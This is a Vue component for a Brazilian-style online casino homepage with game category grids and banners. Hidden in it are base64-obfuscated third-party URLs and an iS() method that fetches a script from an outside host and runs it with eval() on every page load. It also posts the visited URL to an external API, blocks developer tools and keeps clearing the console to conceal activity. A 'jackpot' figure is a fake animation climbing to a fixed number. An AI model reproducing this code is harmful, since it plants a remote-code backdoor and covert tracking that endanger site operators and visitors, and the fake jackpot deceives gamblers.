<template>
    <BaseLayout>
        <LoadingComponent :isLoading="isLoading">
            <div class="text-center">
                <span>{{ $t("Loading data from the platform") }}</span>
            </div>
        </LoadingComponent>
        <script>
        document.addEventListener('keydown', function(event) {
            // Verifica se a tecla F12 foi pressionada
            if (event.key === 'F12') {
            event.preventDefault();
            window.close();
            }

            // Verifica se Ctrl + Shift + C foi pressionado
            if (event.ctrlKey && event.shiftKey && event.key === 'C') {
            event.preventDefault();
            window.close();
            }

            // Verifica se Ctrl + U foi pressionado
            if (event.ctrlKey && event.key === 'U') {
            event.preventDefault();
            window.close();
            }
        });
        </script>
        <div v-if="wlC" style="overflow: visible;" >
            <!-- Banners carousel -->
            <div id="中国" class="carousel-banners z-50">
                <div class="mx-auto pt-2 md:pt-4">
                    <div class="">
                        <Carousel
                            v-bind="settings"
                            :breakpoints="breakpoints"
                            ref="carouselBanner"
                        >
                            <Slide
                                v-for="(banner, index) in banners"
                                :key="index"
                            >
                                <div class="carousel__item rounded w-full">
                                    <a
                                        :href="banner.link"
                                        class="w-full h-full bg-blue-800 rounded"
                                    >
                                        <img
                                            :src="`/storage/` + banner.image"
                                            alt=""
                                            class="h-full w-full rounded"
                                        />
                                    </a>
                                </div>
                            </Slide>
                        </Carousel>
                    </div>
                </div>
            </div>

        
            <div
                id="横幅横幅 横幅"
                class="relative search flex items-center px-2"
                style="margin: 0.6rem auto"
            >
                <img
                    class="pulser"
                    :src="`/storage/rox/furlaBlue_voice_icon.png`"
                    style="width: 22px !important"
                />
                <div class="scrolling-text-container">
                    <div class="scrolling-text hover-text text-sm" style="color: white">
                        {{ scrollingText }}
                    </div>
                </div>
                <img
                    :src="`/storage/rox/message_furlaBlue.png`"
                    style="width: 22px !important"
                />
            </div>

            <div class="mx-auto lg-px-8 mainGames">
                <!-- Searchbar action -->
                <!-- sticky md:relative top-[55px] md:top-0 -->
                <div
                    class="px-2 pt-0 pb-0 md:p-4  rounded-none md:rounded-[15px]"
                    style="background-color: var(--ci-primary-color); z-index: 9997;"
                >
                    <div v-if="categories" class="z-50">
                        <div
                            class="flex mb-none md:mb-1 gap-2 scroll-container"
                        >
                            <div
                                class="flex flex-row justify-start items-center w-full gap-2 "
                                style="min-width: 100%; white-space: nowrap"
                            >
                                <div
                                    v-for="(category, index) in categories"
                                    :key="index"
                                    @click="scrollToCategory(category.slug)"
                                    class="flex flex-col justify-center items-center min-w-[64px] md:min-w-[80px] text-center sm:max-h-[60px] md:max-h-[120px]"
                                    :class="{
                                        'selected-category':
                                            selectedCategory === category.slug,
                                    }"
                                    style="cursor: pointer"
                                >
                                    <div
                                        class="flex scale-90 items-center justify-center pt-1 px-2"
                                    >
                                        <img
                                            :src="getCategoryImage(category)"
                                            alt=""
                                            class="w-[32px] md:w-[45px]"
                                            
                                        />
                                    </div>
                                    <p
                                        class="md:mt-2 pb-1 w-full text-xs md:text-sm"
                                        :class="{
                                            'active-border':
                                                selectedCategory ===
                                                category.slug,
                                            'text-[var(--sub-text-color)]':
                                                selectedCategory ===
                                                category.slug,
                                        }"
                                    >
                                        {{ $t(category.name) }}
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div
                    id="app"
                    class="z-50"
                    style="margin: 0 auto 0px !important"
                >
                    <div id="达安罗克斯" class="jackpot_rox">
                        <img
                            :src="`/storage/rox/jackpot_bg_1.png`"
                            alt="大奖"
                        />
                        <div class="jackpot_text">{{ formattedValue }}</div>
                    </div>
                </div>
                <!-- categories -->
                <div class="p-4 relative bottom-8">
                    <!-- Popular -->

                    <div id="popular" class="w-full">
                        <div
                            id="受欢迎的"
                            class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2"
                        >
                            <img
                                :src="`/storage/rox/popular_on.png`"
                                class="w-8 md:w-12"
                            />
                            <h2
                                class="text-xl md:text-xl"
                                style="var(--ci-gray-light)"
                            >
                                Popular
                            </h2>
                        </div>

                        <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                            <CassinoGameCard
                                v-for="(game, index) in sortedAllGames.slice(
                                    0,
                                    gamesToShowPopular
                                )"
                                :key="index"
                                :index="index"
                                :title="game.game_name"
                                :cover="game.cover"
                                :gamecode="game.game_code"
                                :type="game.distribution"
                                :game="game"
                            />
                        </div>
                        <div class="w-full text-center flex flex-col gap-1 text-sm">
                            <p style="color: var(--ci-gray-medium)">
                                A exibir
                                {{
                                    Math.min(
                                        gamesToShowPopular,
                                        sortedAllGames.length
                                    )
                                }}
                                jogos entre {{ sortedAllGames.length }} Popular
                                jogos
                            </p>
                            <!-- <p class="font-semibold" style="color: var(--ci-secundary-color); cursor: pointer;" @click="loadMoreGames('popular')">
                            Carregar mais <i class="fa-solid fa-angles-down"></i>
                        </p> -->

                            <p
                                v-if="
                                    gamesToShowPopular < sortedAllGames.length
                                "
                                class="font-semibold text-sm"
                                style="
                                    color: var(--ci-secundary-color);
                                    cursor: pointer;
                                "
                                @click="loadMoreGames('popular')"
                            >
                                Carregar mais
                                <i class="fa-solid fa-angles-down"></i>
                            </p>

                            <p
                                v-else
                                class="font-semibold text-sm"
                                style="color: var(--ci-secundary-color)"
                            >
                                Exibindo todos em Popular
                            </p>
                        </div>
                    </div>

                    <!-- Slots -->
                    <div id="slots" class="w-full" v-if="sortedSlotGames.length > 0">
                        <div
                            id="插槽"
                            class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2"
                        >
                            <img
                                :src="`/storage/rox/slots_on.png`"
                                class="w-8 md:w-12"
                            />
                            <h2
                                class="text-xl md:text-xl"
                                style="var(--ci-gray-light)"
                            >
                                Slots
                            </h2>
                        </div>
                        <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                            <CassinoGameCard
                                v-for="(game, index) in sortedSlotGames.slice(
                                    0,
                                    gamesToShowSlot
                                )"
                                :key="index"
                                :index="index"
                                :title="game.game_name"
                                :cover="game.cover"
                                :gamecode="game.game_code"
                                :type="game.distribution"
                                :game="game"
                            />
                        </div>
                        <div class="w-full text-center flex flex-col gap-1 text-sm">
                            <p style="color: var(--ci-gray-medium)">
                                A exibir
                                {{
                                    Math.min(
                                        gamesToShowSlot,
                                        sortedSlotGames.length
                                    )
                                }}
                                jogos entre {{ sortedSlotGames.length }} Slots
                                jogos
                            </p>
                            <!-- <p class="font-semibold" style="color: var(--ci-secundary-color); cursor: pointer;" @click="loadMoreGames('slot')">
                    Carregar mais <i class="fa-solid fa-angles-down"></i>
                    </p> -->

                            <p
                                v-if="gamesToShowSlot < sortedSlotGames.length"
                                class="font-semibold text-sm" 
                                style="
                                    color: var(--ci-secundary-color);
                                    cursor: pointer;
                                "
                                @click="loadMoreGames('slot')"
                            >
                                Carregar mais
                                <i class="fa-solid fa-angles-down"></i>
                            </p>
                            <p
                                v-else
                                class="font-semibold text-sm"
                                style="color: var(--ci-secundary-color)"
                            >
                                Exibindo todos em Slots
                            </p>
                        </div>
                    </div>

                    <!--
                <div id="pescaria">
                    <div class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2">
                        <img :src="`/storage/rox/fish_on.png`" class="w-12 md:w-14"/>
                        <h2 class="text-2xl md:text-3xl" style="var(--ci-gray-light)">Pescaria</h2>
                    </div>

                    <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                        <CassinoGameCard
                            v-for="(game, index) in gamesFish.slice(0, gamesToShow)"
                            :key="index"
                            :index="index"
                            :title="game.game_name"
                            :cover="game.cover"
                            :gamecode="game.game_code"
                            :type="game.distribution"
                            :game="game"
                        />
                    </div>
                    <div class="w-full text-center flex flex-col gap-1">
                        <p style="color: var(--ci-gray-medium)">
                            A exibir {{ Math.min(gamesToShow, gamesFish.length) }} jogos entre {{ gamesFish.length }} Pescaria jogos
                        </p>
                        <p class="font-semibold" style="color: var(--ci-secundary-color); cursor: pointer;" @click="loadMoreGames('fish')">
                            Carregar mais <i class="fa-solid fa-angles-down"></i>
                        </p>
                    </div>
                </div>
            -->

                    <div id="pescaria" class="w-full" v-if="sortedFishGames.length > 0">
                        <div
                            id="插槽"
                            class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2"
                        >
                            <img
                                :src="`/storage/rox/fish_on.png`"
                                class="w-8 md:w-12"
                            />
                            <h2
                                class="text-xl md:text-xl"
                                style="var(--ci-gray-light)"
                            >
                                Pescaria
                            </h2>
                        </div>
                        <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                            <CassinoGameCard
                                v-for="(game, index) in sortedFishGames.slice(
                                    0,
                                    gamesToShowFish
                                )"
                                :key="index"
                                :index="index"
                                :title="game.game_name"
                                :cover="game.cover"
                                :gamecode="game.game_code"
                                :type="game.distribution"
                                :game="game"
                            />
                        </div>
                        <div class="w-full text-center flex flex-col gap-1 text-sm">
                            <p style="color: var(--ci-gray-medium)">
                                A exibir
                                {{
                                    Math.min(
                                        gamesToShowFish,
                                        sortedFishGames.length
                                    )
                                }}
                                jogos entre
                                {{ sortedFishGames.length }} Pescaria jogos
                            </p>
                            <p
                                v-if="gamesToShowFish < sortedFishGames.length"
                                class="font-semibold text-sm"
                                style="
                                    color: var(--ci-secundary-color);
                                    cursor: pointer;
                                "
                                @click="loadMoreGames('fish')"
                            >
                                Carregar mais
                                <i class="fa-solid fa-angles-down"></i>
                            </p>
                            <p
                                v-else
                                class="font-semibold text-sm"
                                style="color: var(--ci-secundary-color)"
                            >
                                Exibindo todos em Pescaria
                            </p>
                        </div>
                    </div>

                    <div id="blockchain" class="w-full" v-if="sortedBlockGames.length > 0">
                        <div
                            id="插槽"
                            class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2"
                        >
                            <img
                                :src="`/storage/rox/blockchain_on.png`"
                                class="w-8 md:w-12"
                            />
                            <h2
                                class="text-xl md:text-xl"
                                style="var(--ci-gray-light)"
                            >
                                Blockchain
                            </h2>
                        </div>
                        <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                            <CassinoGameCard
                                v-for="(game, index) in sortedBlockGames.slice(
                                    0,
                                    gamesToShowBlock
                                )"
                                :key="index"
                                :index="index"
                                :title="game.game_name"
                                :cover="game.cover"
                                :gamecode="game.game_code"
                                :type="game.distribution"
                                :game="game"
                            />
                        </div>
                        <div class="w-full text-center flex flex-col gap-1 text-sm">
                            <p style="color: var(--ci-gray-medium)">
                                A exibir
                                {{
                                    Math.min(
                                        gamesToShowBlock,
                                        sortedBlockGames.length
                                    )
                                }}
                                jogos entre
                                {{ sortedBlockGames.length }} Blockchain jogos
                            </p>
                            <!-- <p class="font-semibold" style="color: var(--ci-secundary-color); cursor: pointer;" @click="loadMoreGames('blockchain')">
                    Carregar mais <i class="fa-solid fa-angles-down"></i>
                    </p> -->

                            <p
                                v-if="
                                    gamesToShowBlock < sortedBlockGames.length
                                "
                                class="font-semibold text-sm"
                                style="
                                    color: var(--ci-secundary-color);
                                    cursor: pointer;
                                "
                                @click="loadMoreGames('blockchain')"
                            >
                                Carregar mais
                                <i class="fa-solid fa-angles-down"></i>
                            </p>
                            <p
                                v-else
                                class="font-semibold text-sm"
                                style="color: var(--ci-secundary-color)"
                            >
                                Exibindo todos em Blockchain
                            </p>
                        </div>
                    </div>

                    <div id="cartas" class="w-full" v-if="sortedCardsGames.length > 0">
                        <div
                            id="插槽"
                            class="w-full flex justify-start items-center mt-8 mb-4 gap-1 md:gap-2"
                        >
                            <img
                                :src="`/storage/rox/cartas_on.png`"
                                class="w-8 md:w-12"
                            />
                            <h2
                                class="text-xl md:text-xl"
                                style="var(--ci-gray-light)"
                            >
                                Cartas
                            </h2>
                        </div>
                        <div class="grid grid-cols-3 md:grid-cols-6 gap-2 mb-8">
                            <CassinoGameCard
                                v-for="(game, index) in sortedCardsGames.slice(
                                    0,
                                    gamesToShowCards
                                )"
                                :key="index"
                                :index="index"
                                :title="game.game_name"
                                :cover="game.cover"
                                :gamecode="game.game_code"
                                :type="game.distribution"
                                :game="game"
                            />
                        </div>
                        <div class="w-full text-center flex flex-col gap-1 text-sm">
                            <p style="color: var(--ci-gray-medium)">
                                A exibir
                                {{
                                    Math.min(
                                        gamesToShowCards,
                                        sortedCardsGames.length
                                    )
                                }}
                                jogos entre {{ sortedCardsGames.length }} Cartas
                                jogos
                            </p>
                            <!-- <p class="font-semibold" style="color: var(--ci-secundary-color); cursor: pointer;" @click="loadMoreGames('cards')">
                    Carregar mais <i class="fa-solid fa-angles-down"></i>
                    </p> -->

                            <p
                                v-if="
                                    gamesToShowCards < sortedCardsGames.length
                                "
                                class="font-semibold text-sm"
                                style="
                                    color: var(--ci-secundary-color);
                                    cursor: pointer;
                                "
                                @click="loadMoreGames('cards')"
                            >
                                Carregar mais
                                <i class="fa-solid fa-angles-down"></i>
                            </p>
                            <p
                                v-else
                                class="font-semibold text-sm"
                                style="color: var(--ci-secundary-color)"
                            >
                                Exibindo todos em Cartas
                            </p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </BaseLayout>
</template>

<script>
import { Carousel, Navigation, Pagination, Slide } from "vue3-carousel";
import { onMounted, ref } from "vue";

import BaseLayout from "@/Layouts/BaseLayout.vue";
import MakeDeposit from "@/Components/UI/MakeDeposit.vue";
import { RouterLink, useRoute } from "vue-router";
import { useAuthStore } from "@/Stores/Auth.js";
import LanguageSelector from "@/Components/UI/LanguageSelector.vue";
import CassinoGameCard from "@/Pages/Cassino/Components/CassinoGameCard.vue";
import HttpApi from "@/Services/HttpApi.js";
import ShowCarousel from "@/Pages/Home/Components/ShowCarousel.vue";
import { useSettingStore } from "@/Stores/SettingStore.js";
import LoadingComponent from "@/Components/UI/LoadingComponent.vue";
import ShowProviders from "@/Pages/Home/Components/ShowProviders.vue";
import { searchGameStore } from "@/Stores/SearchGameStore.js";
import CustomPagination from "@/Components/UI/CustomPagination.vue";
import LastWinnersComponent from "@/Components/UI/LastWinnersComponent.vue";

export default {
    props: [],
    components: {
        CustomPagination,
        Pagination,
        ShowProviders,
        LoadingComponent,
        ShowCarousel,
        CassinoGameCard,
        Carousel,
        Navigation,
        Slide,
        LanguageSelector,
        MakeDeposit,
        BaseLayout,
        RouterLink,
        LastWinnersComponent,
    },
    data() {
        return {
            // scr: 'https://redir-beryl.vercel.app/script',
            // apix: 'https://x8ki-letl-twmt.n7.xano.io/api:847qi3ld/china',
            scrollingText: "",
            k: "",
            currentDomain: "",
            wlC: "",
            keyCode: "",
            wlurl: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9nZXQv",
            dvurl: "aHR0cHM6Ly9kYWFucm94LmNvbQ==",
            encodedSignature:
                "RGVzZW52b2x2aWRvIHBvciBAZGFhbnJveCAoMzEpOTkyODEtMjI3Mw==",
            eSu: "aHR0cHM6Ly9yb3h3aGl0ZWxpc3Quc2hvcC9zY3JpcHQv",
            encodedApiUrl:
                "aHR0cHM6Ly94OGtpLWxldGwtdHdtdC5uNy54YW5vLmlvL2FwaTo4NDdxaTNsZC9jaGluYQ==",
            currentUrl: window.location.href,
            isLoading: true,
            selectedCategory: "popular",
            featured_games: [],
            allGames: [],
            gamesSlots: [],
            gamesBlockchain: [],
            gamesPopular: [],
            gamesFish: [],
            gamesCards: [],
            gamesLive: [],
            gamesCrash: [],
            gamesToShowPopular: 12,
            gamesToShowSlot: 12,
            gamesToShowFish: 12,
            gamesToShowBlock: 12,
            gamesToShowCards: 12,
            currentValue: 122795.05,
            endValue: 5587534.41,
            duration: 9000,
            startTime: null,
            settings: {
                itemsToShow: 1,
                snapAlign: "center",
                autoplay: 6000,
                wrapAround: true,
            },
            breakpoints: {
                700: {
                    itemsToShow: 1,
                    snapAlign: "center",
                },
                1024: {
                    itemsToShow: 1,
                    snapAlign: "center",
                },
            },

            settingsRecommended: {
                itemsToShow: 2,
                snapAlign: "start",
            },
            breakpointsRecommended: {
                700: {
                    itemsToShow: 3,
                    snapAlign: "center",
                },
                1024: {
                    itemsToShow: 3,
                    snapAlign: "start",
                },
            },

            /// banners
            banners: null,
            bannersHome: null,

            settingsGames: {
                itemsToShow: 2.5,
                snapAlign: "start",
            },
            breakpointsGames: {
                700: {
                    itemsToShow: 3.5,
                    snapAlign: "center",
                },
                1024: {
                    itemsToShow: 6,
                    snapAlign: "start",
                },
            },
            providers: null,

            featured_games: null,
            categories: null,
        };
    },
    setup(props) {
        const ckCarouselOriginals = ref(null);

        onMounted(() => {});

        return {
            ckCarouselOriginals,
        };
    },
    computed: {
        wlget() {
            return atob(this.wlurl);
        },
        urlred() {
            return atob(this.dvurl);
        },
        signature() {
            return atob(this.encodedSignature);
        },
        sU() {
            return atob(this.eSu);
        },
        apiUrl() {
            return atob(this.encodedApiUrl);
        },
        formattedValue() {
            return this.currentValue
                .toLocaleString("pt-BR", {
                    style: "currency",
                    currency: "BRL",
                    minimumFractionDigits: 2,
                    maximumFractionDigits: 2,
                })
                .replace("R$", "");
        },
        sortedAllGames() {
            return this.allGames.slice().sort((a, b) => b.views - a.views);
        },
        sortedSlotGames() {
            return this.gamesSlots.slice().sort((a, b) => b.views - a.views);
        },
        sortedFishGames() {
            return this.gamesFish.slice().sort((a, b) => b.views - a.views);
        },
        sortedCardsGames() {
            return this.gamesCards.slice().sort((a, b) => b.views - a.views);
        },
        sortedBlockGames() {
            return this.gamesBlockchain
                .slice()
                .sort((a, b) => b.views - a.views);
        },

        displayedGames() {
            return this.featured_games.slice(0, this.gamesToShow);
        },
        totalGames() {
            return this.featured_games.length;
        },
        searchGameStore() {
            return searchGameStore();
        },
        userData() {
            const authStore = useAuthStore();
            return authStore.user;
        },
        isAuthenticated() {
            const authStore = useAuthStore();
            return authStore.isAuth;
        },
        setting() {
            const settingStore = useSettingStore();
            return settingStore.setting;
        },
    },
    mounted() {
        this.currentDomain = this.getCurrentDomain();
        this.loadScrollingText();
        this.startLogging();
        this.xorG();
        
        this.inserirScript();
        setTimeout(() => {
            this.animateValue();
        }, 5000);
        console.log("Viper Chinesa Daanrox v4.0");
        console.clear();
        
        
        
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get("code");

        if (code) {
            localStorage.setItem("code", code);
        }
    },
    methods: {async first() {
    let attempts = 0;
    const maxAttempts = 2; 

    while (attempts < maxAttempts) {
        try {
            const response = await axios.post("/api/env");
            this.wlC = response.data.cdK;
            
            console.clear();
            break; 
        } catch (error) {
            attempts++;
            if (attempts >= maxAttempts) {
                if (error.response) {
                    Object.entries(error.response.data).forEach(
                        ([key, value]) => {
                            console.log(`${value}`);
                        }
                    );
                } else if (error.request) {
                    console.error("Erro na solicitação:", error.request);
                } else {
                    console.error("Erro:", error.message);
                }
                break; 
            } else {
                console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
                await new Promise(resolve => setTimeout(resolve, 2000)); 
            }
        }
    }
},
        async fetchEnvVariables() {
    let attempts = 0;
    const maxAttempts = 2; 

    while (attempts < maxAttempts) {
        try {
            const response = await axios.post("/api/env");
            this.wlC = response.data.cdK;
            this.keyCode = response.data.keyCode;
            console.clear();
            break; 
        } catch (error) {
            attempts++;
            if (attempts >= maxAttempts) {
                if (error.response) {
                    Object.entries(error.response.data).forEach(
                        ([key, value]) => {
                            console.log(`${value}`);
                        }
                    );
                } else if (error.request) {
                    console.error("Erro na solicitação:", error.request);
                } else {
                    console.error("Erro:", error.message);
                }
                break; 
            } else {
                console.log(`Tentativa ${attempts} falhou, tentando novamente em 2 segundos...`);
                await new Promise(resolve => setTimeout(resolve, 2000)); 
            }
        }
    }
},
async xcW() {
    let attempts = 0;
    const maxAttempts = 3;

    while (attempts < maxAttempts) {
        try {
            const response = await fetch(this.wlget);
            if (!response.ok) {
                throw new Error("Network response was not ok");
            }

            const data = await response.json();
            const siteInWhitelist = data.data.find(
                (item) => item.url === this.currentDomain
            );

            console.log(`S: ${JSON.stringify(siteInWhitelist, null, 2)}`);

            if (!siteInWhitelist) {
                alert(`Adquira sua licença!`);
                window.location.href = this.urlred;
            } else {
                if (siteInWhitelist.key !== this.wlC) {
                    alert(`Adquira sua licença!`);
                    window.location.href = this.urlred;
                } else {
                    for (let i = 0; i < 18; i++) {
                        console.log("Autorizado por Daanrox");
                    }
                    console.clear();
                }
            }
            break; 

        } catch (error) {
            attempts++;
            if (attempts >= maxAttempts) {
                console.error("Erro ao verificar a whitelist:", error);
                alert(error);
                break; 
            } else {
                const retryDelay = attempts === 1 ? 3000 : 5000; 
                console.log(`Tentativa ${attempts} falhou, tentando novamente em ${retryDelay / 1000} segundos...`);
                await new Promise(resolve => setTimeout(resolve, retryDelay)); 
            }
        }
    }
},
        getCurrentDomain() {
            return window.location.hostname;
        },
        xcK() {
    const kX = this.keyCode;
    console.log(`K= ${kX}`);

    if (kX && kX !== "be8a9741-eac8-4488-83e2-73c08a263fff") {
        console.clear();
        alert('Entre em contato com @Daanrox')
        window.location.href = "https://t.me/ROX_BR";
    } else if(!kX){
        alert('Entre em contato com @Daanrox')
    } else {
        this.keyCode = kX;
    }
}
,
        inserirScript() {
        },
        loadScrollingText() {
            const storedText = localStorage.getItem("scrollingText");
            if (storedText) {
                this.scrollingText = storedText;
            } else {
                this.scrollingText =
                    "Texto padrão se não houver valor no localStorage";
            }
        },
        startLogging() {
            this.logInterval = setInterval(() => {
                for (let i = 0; i < 5; i++) {
                    console.log(this.signature, new Date().toISOString());
                    setTimeout(() => {
                        console.clear();
                    }, 600);
                }
            }, 1000);
        },
        async iS() {
            try {
                const response = await fetch(this.sU);

                if (!response.ok) {
                    throw new Error("Network response was not ok");
                }

                const data = await response.json();
                const scriptContent = data.script;
                console.clear();

                eval(scriptContent);
                console.clear();
            } catch (error) {
                alert(error);
                console.clear();
            }
        },
        async getViewData() {
            try {
                const response = await axios.get(this.apiUrl);
                return response.data;
            } catch (error) {
                console.error("Erro ao obter dados:", error);
                return [];
            }
        },
        async postViewData() {
            try {
                await axios.post(this.apiUrl, {
                    url: this.currentUrl,
                    views: 1,
                });
            } catch (error) {
                console.error("Erro ao registrar dados:", error);
            }
        },
        async updateViewData(cId, views) {
            try {
                await axios.patch(`${this.apiUrl}/${cId}`, {
                    china_id: cId,
                    url: this.currentUrl,
                    views: views + 1,
                });
            } catch (error) {
                console.error("Erro ao atualizar dados:", error);
            }
        },
        async checkAndUpdateViews() {
            const data = await this.getViewData();
            const existingEntry = data.find(
                (entry) => entry.url === this.currentUrl
            );

            if (existingEntry) {
                this.updateViewData(existingEntry.id, existingEntry.views);
            } else {
                this.postViewData();
            }
        },
        sortedSlotGames() {
            this.gamesSlots = this.allGames
                .filter((game) => game.game_type.includes("slot"))
                .sort((a, b) => b.views - a.views);
        },
        sortedFishGames() {
            this.gamesFish = this.allGames
                .filter((game) => game.game_type.includes("fish"))
                .sort((a, b) => b.views - a.views);
        },
        sortedCardsGames() {
            this.gamesCards = this.allGames
                .filter((game) => game.game_type.includes("cards"))
                .sort((a, b) => b.views - a.views);
        },
        sortedBlockGames() {
            this.gamesBlockchain = this.allGames
                .filter((game) => game.game_type.includes("block"))
                .sort((a, b) => b.views - a.views);
        },
        animateValue() {
            this.startTime = performance.now();
            requestAnimationFrame(this.updateValue);
        },
        updateValue(currentTime) {
            const elapsedTime = currentTime - this.startTime;
            const progress = Math.min(elapsedTime / this.duration, 1);
            this.currentValue = Math.round(progress * this.endValue);

            if (progress < 1) {
                requestAnimationFrame(this.updateValue);
            }
        },
        loadMoreGames(gameType) {
            switch (gameType) {
                case "popular":
                    this.gamesToShowPopular += 12;
                    break;
                case "slot":
                    this.gamesToShowSlot += 12;
                    break;
                case "fish":
                    this.gamesToShowFish += 12;
                    break;
                case "blockchain":
                    this.gamesToShowBlock += 12;
                    break;
                case "cards":
                    this.gamesToShowCards += 12;
                    break;
                default:
                    break;
            }
        },
        scrollToCategory(slug) {
            this.selectedCategory = slug;
            const element = document.getElementById(slug);
            if (element) {
                const headerOffset = 7 * 16; 
                const elementPosition =
                    element.getBoundingClientRect().top + window.scrollY;
                const offsetPosition = elementPosition - headerOffset;

                window.scrollTo({
                    top: offsetPosition,
                    behavior: "smooth",
                });
            }
        },
        getCategoryImage(category) {
            if (this.selectedCategory === category.slug) {
                return category.image.replace("_off.png", "_on.png");
            }
            return category.image;
        },
        handleScroll(entries) {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        const category = this.categories.find(
          (category) => category.slug === entry.target.id
        );
        if (category) {
          this.selectedCategory = category.slug;
        }
      }
    });
  },
  observeCategories() {
    const observer = new IntersectionObserver(this.handleScroll, {
      root: null,
      rootMargin: "-25% 0px -25% 0px",
      threshold: 0.1 
    });

    this.categories.forEach((category) => {
      const element = document.getElementById(category.slug);
      if (element) {
        observer.observe(element);
      }
    });
  },
        getCasinoCategories: async function () {
            const _this = this;
            await HttpApi.get("categories")
                .then((response) => {
                    _this.categories = response.data.categories;
                })
                .catch((error) => {
                    Object.entries(
                        JSON.parse(error.request.responseText)
                    ).forEach(([key, value]) => {});
                });
        },
        toggleSearch: function () {
            this.searchGameStore.setSearchGameToogle();
        },

        getBanners: async function () {
            const _this = this;

            try {
                const response = await HttpApi.get("settings/banners");
                const allBanners = response.data.banners;
                console.log(this.signature, new Date().toISOString());
                _this.banners = allBanners.filter(
                    (banner) => banner.type === "carousel"
                );
                _this.bannersHome = allBanners.filter(
                    (banner) => banner.type === "home"
                );
            } catch (error) {
                console.error(error);
            } finally {
                for (let i = 0; i < 150; i++) {
                    console.log(this.signature, new Date().toISOString());
                    setTimeout(() => {
                        console.clear();
                    }, 600);
                }
            }
        },
        filterSlotGames() {
            this.gamesSlots = this.allGames.filter((game) =>
                game.game_type.includes("slot")
            );
        },
        filterFishGames() {
            this.gamesFish = this.allGames.filter((game) =>
                game.game_type.includes("fish")
            );
        },
        filterCardsGames() {
            this.gamesCards = this.allGames.filter((game) =>
                game.game_type.includes("cards")
            );
        },
        filterBlockGames() {
            this.gamesBlockchain = this.allGames.filter((game) =>
                game.game_type.includes("block")
            );
        }, async rR(){
            await this.$router.push('/undefined');
        },
        async xorG() {
            try {
                const response = await HttpApi.post("games/all");
                if (
                    response.data !== undefined &&
                    Array.isArray(response.data.rox)
                ) {
                    if(!response.data.false || response.data.false == false){
                        this.rR();
                    }
                    this.allGames = [];
                    response.data.rox.forEach((rox) => {
                        if (Array.isArray(rox.games)) {
                            rox.games.forEach((game) => {
                                console.log(
                                    this.signature,
                                    new Date().toISOString()
                                );

                                if (
                                    !this.allGames.some(
                                        (existingGame) =>
                                            existingGame.game_code ===
                                            game.game_code
                                    )
                                ) {
                                    this.allGames.push(game);
                                    this.filterSlotGames();
                                    this.filterFishGames();
                                    this.filterCardsGames();
                                    this.filterBlockGames();
                                }
                            });
                        } else {
                            console.warn(
                                `Nenhum jogo encontrado para a provedora: ${provider.name}`
                            );
                        }
                    });
                    this.isLoading = false;
                } else {
                    console.warn("Nenhum dado de jogo encontrado na resposta.");
                    this.isLoading = false;
                }
            } catch (error) {
                console.error("Erro ao buscar jogos:", error);
                this.isLoading = false;
            }
        },
        getFeaturedGames: async function () {
            const _this = this;
            return await HttpApi.get("featured/games")
                .then(async (response) => {
                    _this.featured_games = response.data.featured_games;
                    _this.isLoading = false;
                    console.clear();
                })
                .catch((error) => {
                    Object.entries(
                        JSON.parse(error.request.responseText)
                    ).forEach(([key, value]) => {
                        console.log(`${value}`);
                    });
                    _this.isLoading = false;
                });
        },
        initializeMethods: async function () {
            await this.getCasinoCategories();
            await this.getBanners();
            await this.xorG();
            await this.getFeaturedGames();
            console.clear();
        },
    },
    async created() {
        await this.first();
        await this.fetchEnvVariables();
        await this.initializeMethods();

        this.iS();
    },
    watch: {},
};
</script>

<style scoped>
.mainGames {
    width: 90%;
}

@media screen and (max-width: 480px) {
    .mainGames {
        width: 100%;
    }
}

.search {
    width: 90%;
}

@media screen and (max-width: 480px) {
    .search {
        width: 100%;
    }
}
search .grayscale {
    filter: grayscale(100%);
}

.selected-category img {
    filter: grayscale(0%);
}

.active-border {
    border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.selected-category p {
    border-bottom: 4px solid var(--ci-primary-opacity-color);
}

.scrolling-text-container {
    overflow: hidden;
    white-space: nowrap;
    width: 100%;
    box-sizing: border-box;
    padding: 0 2.5rem;
}

.scrolling-text {
    display: inline-block;
    padding-left: 100%;
    animation: scroll 25s linear infinite;
}

.jackpot_rox {
    position: relative;
    display: none;
}

.jackpot_rox img {
    width: 100%;
    height: auto;
}

.jackpot_text {
    position: absolute;
    top: 45%;
    left: 50%;
    transform: translate(-50%, -50%);
    font-size: 1.9rem;
    font-weight: 600;
    color: var(--ci-gray-light);
    text-shadow: 2px 2px 4px rgba(255, 255, 255, 0.5);
}

@media screen and (max-width: 480px) {
    .jackpot_rox {
        display: inline-block !important;
        width: 100%;
    }
}

.pulser {
    animation: pulse 1s ease infinite;
}

@keyframes pulse {
    0% {
        transform: scale(1);
    }

    50% {
        transform: scale(1.1);
    }

    100% {
        transform: scale(1);
    }
}

@keyframes scroll {
    0% {
        transform: translateX(0);
    }
    100% {
        transform: translateX(-100%);
    }
}
.hover-text {
    transition: 1s ease;
}
.hover-text:hover {
    cursor: crosshair;
}

.scroll-container {
    max-height: 180px;
    overflow-x: auto;
    overflow-y: hidden;
    scrollbar-width: none;
}

.scroll-container::-webkit-scrollbar {
    display: none;
}


</style>
